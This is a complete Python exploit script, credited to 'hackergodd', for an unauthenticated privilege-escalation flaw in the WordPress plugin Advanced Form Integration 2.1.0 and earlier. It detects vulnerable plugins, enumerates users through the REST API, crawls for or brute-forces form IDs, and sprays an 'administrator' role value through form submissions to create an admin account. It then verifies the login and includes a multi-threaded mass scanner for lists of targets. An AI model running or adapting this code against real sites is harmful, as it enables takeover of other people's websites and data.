#!/usr/bin/env python3
"""
Advanced Form Integration 2.1.0 — Privilege Escalation Exploit
Author: hackergodd

Vulnerability: Unauthenticated user role escalation via Breakdance form ->
               WooCommerce Create Customer field substitution.

Chain: wp_ajax_nopriv_breakdance_form_custom (breakdance.php:398)
    -> adfoin_breakdance_submission() reads $_POST['fields'] unauthenticated
    -> adfoin_dispatch_integrations() (functions-adfoin.php:1099)
    -> adfoin_get_parsed_values() substitutes {{field_id}} templates
    -> woocommerce.php:170  $user->set_role($parsed['role'])
    -> attacker becomes administrator

Prerequisites on target:
  - WordPress + Advanced Form Integration <= 2.1.0
  - Breakdance Forms plugin active
  - WooCommerce active
  - Admin configured: Breakdance form -> WC Create Customer integration
  - Admin mapped a form field to the "Role" action field via {{field_id}}

Additional triggers (all unauthenticated nopriv hooks):
  - breakdance_form_custom       (breakdance.php)
  - ea_final_appointment         (easyappointments.php)
  - mystickyelements_contact_form (mystickyelements.php)
  - rformsendform                (romethemeform.php)
  - adfoin_tawkto_capture        (tawkto.php)
  - wpzf_submit                  (wpzoomforms.php, admin_post_nopriv)

Additional role-accepting sinks:
  - platforms/wordpress/wordpress.php   (wp_insert_user role)
  - platforms/buddyboss/buddyboss.php   ($user_array['role'])
  - platforms/fluentaffiliate/fluentaffiliate.php ($user_args['role'])

Bonus: adfoin_get_parsed_values runs do_shortcode() on every parsed
field value (functions-adfoin.php ~L1223) — second vuln, shortcode
injection via form submissions.

Usage:
  python3 afi_role_escalation.py -u https://target.com
  python3 afi_role_escalation.py -u https://target.com --email x@x.com --role administrator
  python3 afi_role_escalation.py -u https://target.com --trigger tawkto
  python3 afi_role_escalation.py -u https://target.com -f targets.txt --threads 5
"""

import argparse
import requests
import re
import time
import random
import string
import sys
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

BANNER = """
+------------------------------------------------------+
|  AFI <= 2.1.0 - Role Escalation Exploit             |
|  Breakdance Form -> WooCommerce Create Customer      |
|  Author: hackergodd                                  |
+------------------------------------------------------+
"""

# ---- Unauthenticated trigger definitions ----
# Each trigger: (ajax_action, payload_builder)
# payload_builder takes (post_id, form_id, email, role, username, password)
# and returns the fields dict to merge into the POST payload.

TRIGGERS = {
    'breakdance': {
        'action': 'breakdance_form_custom',
        'param_post_id': 'post_id',
        'param_form_id': 'form_id',
        'param_fields': 'fields',
    },
    'romethemeform': {
        'action': 'rformsendform',
        'param_post_id': 'post_id',
        'param_form_id': 'form_id',
        'param_fields': 'form_data',
    },
    'tawkto': {
        'action': 'adfoin_tawkto_capture',
        'param_post_id': 'post_id',
        'param_form_id': 'form_id',
        'param_fields': 'fields',
    },
    'mystickyelements': {
        'action': 'mystickyelements_contact_form',
        'param_post_id': 'post_id',
        'param_form_id': 'form_id',
        'param_fields': 'contact_form_data',
    },
}


def rand_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))


def rand_password(n=16):
    return ''.join(random.choices(
        string.ascii_letters + string.digits + '!@#$', k=n))


class AFIExploit:

    def __init__(self, target_url, timeout=15, verbose=True):
        self.target = target_url.rstrip('/')
        self.ajax_url = self.target + '/wp-admin/admin-ajax.php'
        self.login_url = self.target + '/wp-login.php'
        self.timeout = timeout
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                          'AppleWebKit/537.36',
            'Accept': 'text/html,application/json',
        })
        self.forms = []
        self.version = None

    def log(self, msg):
        if self.verbose:
            print(msg)

    # ==================================================================
    # PHASE 1: DETECTION
    # ==================================================================

    def check_afi_version(self):
        """Detect AFI plugin version from README.txt."""
        self.log("[*] Checking for Advanced Form Integration...")

        readme_paths = [
            '/wp-content/plugins/advanced-form-integration/README.txt',
            '/wp-content/plugins/advanced-form-integration/readme.txt',
        ]
        for path in readme_paths:
            try:
                r = self.session.get(
                    self.target + path,
                    timeout=self.timeout,
                    allow_redirects=False)
                if r.status_code == 200:
                    m = re.search(r'Stable tag:\s*(\S+)', r.text)
                    if m:
                        self.version = m.group(1)
                        self.log("    [+] AFI version: %s" % self.version)
                        if self.version <= '2.1.0':
                            self.log("    [!!] VULNERABLE VERSION")
                        elif self.version >= '2.1.1':
                            self.log("    [-] Patched (>=2.1.1)")
                        return self.version
            except Exception:
                continue

        self.log("    [?] Could not determine version")
        return None

    def check_plugin(self, name, paths):
        """Generic plugin detection via asset paths."""
        self.log("[*] Checking for %s..." % name)
        for path in paths:
            try:
                r = self.session.get(
                    self.target + path,
                    timeout=self.timeout,
                    allow_redirects=False)
                if r.status_code in (200, 403):
                    self.log("    [+] %s detected" % name)
                    return True
            except Exception:
                continue
        self.log("    [-] %s not found" % name)
        return False

    def check_breakdance(self):
        return self.check_plugin("Breakdance", [
            '/wp-content/plugins/breakdance/assets/css/breakdance.css',
            '/wp-content/plugins/breakdance/plugin.php',
            '/wp-content/plugins/breakdance-relyum/plugin.php',
        ])

    def check_woocommerce(self):
        found = self.check_plugin("WooCommerce", [
            '/wp-content/plugins/woocommerce/woocommerce.php',
        ])
        if not found:
            try:
                r = self.session.get(
                    self.target + '/?rest_route=/wc/store',
                    timeout=self.timeout, allow_redirects=False)
                if r.status_code == 200 and 'store-api' in r.text.lower():
                    self.log("    [+] WooCommerce Store API confirmed")
                    return True
            except Exception:
                pass
        return found

    def check_wp_rest_leak(self):
        """Check if WP REST API leaks user info."""
        self.log("[*] Checking WP REST API for user enumeration...")
        try:
            r = self.session.get(
                self.target + '/wp-json/wp/v2/users',
                timeout=self.timeout, allow_redirects=False)
            if r.status_code == 200:
                users = r.json()
                if isinstance(users, list) and len(users) > 0:
                    self.log("    [+] REST API leaks %d users" % len(users))
                    for u in users[:3]:
                        self.log("        - %s (id:%s)" % (
                            u.get('slug', '?'), u.get('id', '?')))
                    return users
        except Exception:
            pass
        self.log("    [-] REST API users blocked")
        return []

    # ==================================================================
    # PHASE 2: FORM DISCOVERY
    # ==================================================================

    def discover_forms(self):
        """Crawl common pages for Breakdance form post_id/element_id."""
        self.log("[*] Scanning pages for Breakdance forms...")

        pages = [
            '/', '/contact/', '/contact-us/', '/register/',
            '/signup/', '/about/', '/home/', '/services/',
            '/book/', '/appointment/', '/demo/', '/quote/',
        ]
        found = set()

        for page in pages:
            try:
                r = self.session.get(
                    self.target + page,
                    timeout=self.timeout, allow_redirects=False)
                if r.status_code != 200:
                    continue

                # Pattern 1: data-post-id="123" on form elements
                for m in re.finditer(
                    r'data-post-id=["\'](\d+)["\']', r.text
                ):
                    pid = m.group(1)
                    # Look for nearby element ID
                    snippet = r.text[m.start():m.start()+500]
                    eid_m = re.search(
                        r'data-element-id=["\'](\d+)["\']', snippet)
                    eid = eid_m.group(1) if eid_m else '1'
                    found.add("%s_%s" % (pid, eid))

                # Pattern 2: Breakdance JS form config objects
                for m in re.finditer(
                    r'"postId"\s*:\s*"?(\d+)"?[^}]*"elementId"\s*:\s*"?(\d+)"?',
                    r.text, re.DOTALL
                ):
                    found.add("%s_%s" % (m.group(1), m.group(2)))

                # Pattern 3: wp_ajax action in inline JS
                for m in re.finditer(
                    r'action["\']?\s*[:=]\s*["\']breakdance_form_custom',
                    r.text
                ):
                    self.log("    [+] Breakdance AJAX confirmed on %s" % page)

                # Pattern 4: form field names
                for m in re.finditer(
                    r'name=["\']fields\[([^\]]+)\]["\']', r.text
                ):
                    self.log("    [+] Form field found: %s" % m.group(1))

            except Exception:
                continue

        self.forms = list(found)

        if not self.forms:
            self.log("    [-] No forms found via crawling")
            self.log("    [*] Brute-forcing common post IDs 2-20...")
            for pid in range(2, 21):
                for eid in range(1, 4):
                    self.forms.append("%d_%d" % (pid, eid))

        self.log("    [*] %d candidate form(s) queued" % len(self.forms))
        return self.forms

    # ==================================================================
    # PHASE 3: EXPLOITATION
    # ==================================================================

    def build_payload(self, trigger_name, post_id, form_id,
                      email, role, username, password):
        """Build POST payload for the given trigger type."""

        # We don't know which field maps to 'role' in the admin's integration,
        # so we spray the role value into EVERY common field name.
        # If ANY field is mapped via {{field_name}} to the WC Role action field,
        # the role will be substituted in.

        common_fields = {
            # Standard names
            'name': role,
            'your_name': role,
            'full_name': role,
            'first_name': role,
            'last_name': role,
            'fname': role,
            'lname': role,
            'subject': role,
            'message': role,
            'company': role,
            'website': role,
            'phone': role,
            # WP/Woo specific
            'username': username,
            'user_login': username,
            'user_email': email,
            'role': role,
            # Email variants
            'email': email,
            'your_email': email,
            # Generic numbered
            'field_1': role,
            'field_2': email,
            'field_3': username,
            'input_1': role,
            'input_2': email,
            'input_3': username,
            'text1': role,
            'text2': email,
            'name1': role,
            'email1': email,
        }

        trig = TRIGGERS.get(trigger_name, TRIGGERS['breakdance'])

        payload = {
            'action': trig['action'],
            trig['param_post_id']: post_id,
            trig['param_form_id']: form_id,
            trig['param_fields']: common_fields,
        }

        # Some triggers need extra params
        if trigger_name == 'breakdance':
            payload['csrfToken'] = ''

        return payload

    def try_exploit(self, form_id, email, role, username, password,
                    trigger_name='breakdance'):
        """Send exploit payload for a single form."""
        parts = form_id.split('_')
        if len(parts) != 2:
            return None
        post_id, element_id = parts

        payload = self.build_payload(
            trigger_name, post_id, element_id,
            email, role, username, password)

        try:
            r = self.session.post(
                self.ajax_url, data=payload,
                timeout=self.timeout, allow_redirects=False)
            return r
        except Exception as e:
            self.log("    [!] Request error: %s" % str(e))
            return None

    def exploit(self, email=None, role='administrator',
                username=None, password=None, trigger='breakdance'):
        """Run full exploitation flow against a single target."""

        # Generate credentials if not provided
        if not email:
            email = 'afi_%s@mail.com' % rand_str(6)
        if not username:
            username = 'u_' + rand_str(8)
        if not password:
            password = rand_password(16)

        self.log("\n" + BANNER)

        # --- Phase 1: Detection ---
        self.log("=" * 55)
        self.log(" PHASE 1: DETECTION")
        self.log("=" * 55)

        self.check_afi_version()
        self.check_breakdance()
        self.check_woocommerce()
        self.check_wp_rest_leak()

        # --- Phase 2: Form Discovery ---
        self.log("\n" + "=" * 55)
        self.log(" PHASE 2: FORM DISCOVERY")
        self.log("=" * 55)

        self.discover_forms()

        # --- Phase 3: Exploitation ---
        self.log("\n" + "=" * 55)
        self.log(" PHASE 3: EXPLOITATION")
        self.log("=" * 55)

        self.log("    Target:  %s" % self.target)
        self.log("    Email:   %s" % email)
        self.log("    Role:    %s" % role)
        self.log("    User:    %s" % username)
        self.log("    Pass:    %s" % password)
        self.log("    Trigger: %s" % trigger)
        self.log("")

        success = False

        for form_id in self.forms:
            self.log("    -> Form %s" % form_id)
            r = self.try_exploit(
                form_id, email, role, username, password, trigger)

            if r is None:
                continue

            sc = r.status_code
            self.log("       HTTP %d" % sc)

            if sc == 200:
                try:
                    body = r.json()
                    if isinstance(body, dict):
                        if body.get('success') or body.get('type') == 'success':
                            self.log("       [+] SUBMISSION ACCEPTED")
                            success = True
                            break
                        elif body.get('errors'):
                            errs = body['errors']
                            # Check if it's just validation errors (field required)
                            self.log("       [-] Errors: %s" %
                                     str(errs)[:150])
                        else:
                            self.log("       [?] %s" %
                                     json.dumps(body)[:150])
                    else:
                        self.log("       [?] %s" % str(body)[:150])
                except ValueError:
                    txt = r.text.strip()
                    if txt == '0':
                        self.log("       [-] No handler (0)")
                    elif txt == '-1':
                        self.log("       [-] Rejected (-1)")
                    elif len(txt) < 100:
                        self.log("       [?] %s" % txt)
                    else:
                        self.log("       [?] HTML response (%d bytes)" %
                                 len(r.text))

            elif sc == 403:
                self.log("       [-] 403 Forbidden (WAF)")
            elif sc == 500:
                self.log("       [!] 500 — possible crash at sink!")
                self.log("       [!] %s" % r.text[:200])

            time.sleep(0.3)  # rate limit

        # --- Phase 4: Verification ---
        self.log("\n" + "=" * 55)
        self.log(" PHASE 4: VERIFICATION")
        self.log("=" * 55)

        verified = self.verify_account(username, password, email)

        if verified:
            self.log("\n    [SUCCESS] Account created and verified!")
            self.log("    URL:      %s/wp-login.php" % self.target)
            self.log("    Username: %s" % username)
            self.log("    Password: %s" % password)
            self.log("    Email:    %s" % email)
            self.log("    Role:     %s (if exploit worked)" % role)
        elif success:
            self.log("\n    [PARTIAL] Form accepted but login failed.")
            self.log("    User may still have been created (async dispatch).")
            self.log("    Try password reset: %s/wp-login.php?action=lostpassword"
                     % self.target)
        else:
            self.log("\n    [FAILED] No form accepted the submission.")
            self.log("    Possible reasons:")
            self.log("    - Admin hasn't mapped a field to the Role action")
            self.log("    - Using a different form trigger (try --trigger)")
            self.log("    - Patched version (2.1.1+)")
            self.log("    - WAF blocking")

        return {
            'target': self.target,
            'success': success,
            'verified': verified,
            'email': email,
            'username': username,
            'password': password,
            'role': role,
        }

    def verify_account(self, username, password, email):
        """Try to log in with the created account credentials."""
        self.log("[*] Attempting login verification...")

        # First get the login page for cookie/nonce
        try:
            r = self.session.get(
                self.login_url, timeout=self.timeout, allow_redirects=False)
        except Exception:
            pass

        # Attempt login
        login_data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': self.target + '/wp-admin/profile.php',
            'testcookie': '1',
        }

        try:
            r = self.session.post(
                self.login_url, data=login_data,
                timeout=self.timeout, allow_redirects=False)

            # Successful login = 302 redirect to wp-admin or profile
            if r.status_code in (301, 302):
                loc = r.headers.get('Location', '')
                if 'wp-admin' in loc or 'profile' in loc:
                    self.log("    [+] LOGIN SUCCESS — redirect to %s" % loc)

                    # Check role by fetching profile page
                    try:
                        r2 = self.session.get(
                            self.target + '/wp-admin/profile.php',
                            timeout=self.timeout, allow_redirects=True)
                        if r2.status_code == 200:
                            # Look for role indicator in profile page
                            role_match = re.search(
                                r'<select[^>]*name=["\']role["\'][^>]*>.*?'
                                r'<option[^>]*selected[^>]*>([^<]+)',
                                r2.text, re.DOTALL)
                            if role_match:
                                self.log("    [+] Current role: %s" %
                                         role_match.group(1).strip())
                            if 'administrator' in r2.text.lower():
                                self.log("    [!!!] ADMINISTRATOR ACCESS!")
                    except Exception:
                        pass

                    return True
                elif 'login' in loc:
                    self.log("    [-] Login redirect back to login page")
                    return False

            # Check for login error
            if r.status_code == 200:
                if 'incorrect' in r.text.lower() or 'error' in r.text.lower():
                    self.log("    [-] Login failed (invalid credentials)")
                    return False

        except Exception as e:
            self.log("    [!] Login error: %s" % str(e))

        return False

    # ==================================================================
    # MULTI-TRIGGER SWEEP
    # ==================================================================

    def sweep_all_triggers(self, email, role, username, password):
        """Try every unauthenticated trigger against the target."""
        self.log("\n[*] Sweeping all %d trigger types..." % len(TRIGGERS))

        results = []
        for trig_name in TRIGGERS:
            self.log("\n--- Trigger: %s ---" % trig_name)
            for form_id in self.forms[:5]:  # limit to first 5 per trigger
                r = self.try_exploit(
                    form_id, email, role, username, password, trig_name)
                if r and r.status_code == 200:
                    self.log("    [+] %s form %s: 200 OK" % (
                        trig_name, form_id))
                    results.append((trig_name, form_id, True))
                else:
                    sc = r.status_code if r else 'ERR'
                    self.log("    [-] %s form %s: %s" % (
                        trig_name, form_id, sc))

        return results


# ==================================================================
# MASS SCANNER
# ==================================================================

def scan_target(url, timeout=15):
    """Quick vulnerability check for mass scanning."""
    try:
        exp = AFIExploit(url, timeout=timeout, verbose=False)
        ver = exp.check_afi_version()
        bd = exp.check_breakdance()
        wc = exp.check_woocommerce()

        vulnerable = ver and ver <= '2.1.0' and bd and wc

        return {
            'url': url,
            'version': ver,
            'breakdance': bd,
            'woocommerce': wc,
            'vulnerable': vulnerable,
        }
    except Exception as e:
        return {'url': url, 'error': str(e), 'vulnerable': False}


def mass_scan(targets_file, threads=5, output_file='afi_results.txt',
              timeout=15):
    """Scan a list of targets for vulnerable AFI installations."""
    print("[*] Loading targets from %s..." % targets_file)

    with open(targets_file, 'r') as f:
        targets = [line.strip() for line in f if line.strip()]

    print("[*] %d targets loaded" % len(targets))
    print("[*] Scanning with %d threads..." % threads)

    results = []
    vulnerable = []

    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = {pool.submit(scan_target, t, timeout): t for t in targets}

        for i, future in enumerate(as_completed(futures)):
            res = future.result()
            results.append(res)

            status = "VULN" if res.get('vulnerable') else "safe"
            if res.get('vulnerable'):
                vulnerable.append(res)
                print("  [!!] %s — VULNERABLE (v%s)" % (
                    res['url'], res.get('version', '?')))

            if (i + 1) % 50 == 0:
                print("  [%d/%d] scanned..." % (i + 1, len(targets)))

    # Write results
    with open(output_file, 'w') as f:
        for r in results:
            f.write(json.dumps(r) + "\n")

    vuln_file = output_file.replace('.txt', '_vulnerable.txt')
    with open(vuln_file, 'w') as f:
        for v in vulnerable:
            f.write(v['url'] + "\n")

    print("\n[*] Scan complete:")
    print("    Total:     %d" % len(results))
    print("    Vulnerable: %d" % len(vulnerable))
    print("    Results:   %s" % output_file)
    print("    Vuln list: %s" % vuln_file)

    return vulnerable


# ==================================================================
# MAIN
# ==================================================================

def main():
    p = argparse.ArgumentParser(
        description="AFI <= 2.1.0 Role Escalation Exploit (hackergodd)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Single target:
    python3 %(prog)s -u https://target.com

  With custom creds and role:
    python3 %(prog)s -u https://target.com --email x@x.com --role administrator

  Try all triggers:
    python3 %(prog)s -u https://target.com --sweep

  Mass scan:
    python3 %(prog)s -f targets.txt --threads 10
""" % {'prog': sys.argv[0]})

    p.add_argument('-u', '--url', help='Single target URL')
    p.add_argument('-f', '--file', help='File with target URLs (mass scan)')
    p.add_argument('--email', help='Email for new account')
    p.add_argument('--username', help='Username for new account')
    p.add_argument('--password', help='Password for new account')
    p.add_argument('--role', default='administrator',
                   help='Target role (default: administrator)')
    p.add_argument('--trigger', default='breakdance',
                   choices=list(TRIGGERS.keys()),
                   help='Trigger type (default: breakdance)')
    p.add_argument('--sweep', action='store_true',
                   help='Try all trigger types')
    p.add_argument('--threads', type=int, default=5,
                   help='Threads for mass scan (default: 5)')
    p.add_argument('--timeout', type=int, default=15,
                   help='Request timeout (default: 15)')
    p.add_argument('-o', '--output', default='afi_results.txt',
                   help='Output file for mass scan results')

    args = p.parse_args()

    if not args.url and not args.file:
        p.print_help()
        sys.exit(1)

    # --- Mass scan mode ---
    if args.file:
        mass_scan(args.file, threads=args.threads,
                  output_file=args.output, timeout=args.timeout)
        return

    # --- Single target mode ---
    exp = AFIExploit(args.url, timeout=args.timeout, verbose=True)

    if args.sweep:
        # Run detection + discovery first
        exp.check_afi_version()
        exp.check_breakdance()
        exp.check_woocommerce()
        exp.discover_forms()

        email = args.email or ('afi_%s@mail.com' % rand_str(6))
        username = args.username or ('u_' + rand_str(8))
        password = args.password or rand_password(16)

        print("\n" + "=" * 55)
        print(" SWEEPING ALL TRIGGERS")
        print("=" * 55)
        print("  Email:    %s" % email)
        print("  Username: %s" % username)
        print("  Password: %s" % password)
        print("  Role:     %s" % args.role)

        results = exp.sweep_all_triggers(email, args.role, username, password)

        print("\n[*] Sweep complete. Accepted submissions:")
        for trig, form_id, ok in results:
            print("    %s / %s" % (trig, form_id))

        # Verify
        exp.verify_account(username, password, email)
    else:
        exp.exploit(
            email=args.email,
            role=args.role,
            username=args.username,
            password=args.password,
            trigger=args.trigger)


if __name__ == '__main__':
    main()
